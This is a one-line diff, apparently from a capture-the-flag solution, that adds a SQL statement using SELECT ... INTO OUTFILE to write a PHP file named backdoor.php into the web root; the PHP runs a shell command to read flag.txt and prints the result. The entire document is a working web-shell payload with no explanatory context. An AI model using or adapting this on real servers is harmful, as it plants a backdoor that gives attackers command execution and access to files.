@@ -1,0 +1,1 @@
+SELECT "<?php $output = shell_exec('cat flag.txt'); echo \"<pre>$output</pre>\"; ?>" INTO OUTFILE "/var/www/html/backdoor.php"
